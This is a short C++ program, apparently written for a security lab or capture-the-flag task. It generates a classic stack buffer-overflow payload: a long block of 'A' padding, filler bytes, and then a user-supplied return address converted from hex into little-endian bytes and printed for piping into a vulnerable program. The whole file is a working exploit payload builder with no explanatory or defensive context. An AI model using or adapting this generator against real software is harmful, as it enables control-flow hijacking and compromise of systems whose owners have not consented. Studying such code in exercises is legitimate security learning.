//
// Created by Marcel Beyer on 12/21/23.
//


#include <iostream>
#include <string>

char hexToChar(const std::string& hex_char) {
    int value = std::stoi(hex_char, nullptr, 16);
    return static_cast<char>(value);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <address>" << std::endl;
        return 1;
    }

    std::string address = argv[1];
    std::string payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD";
    char c;
    int size = (int)address.size();
    for(int i = size-2; i >= 0; i-=2) {
        c = hexToChar(address.substr(i,2));
        payload += c;
    }
    std::cout << payload;

    return 0;
}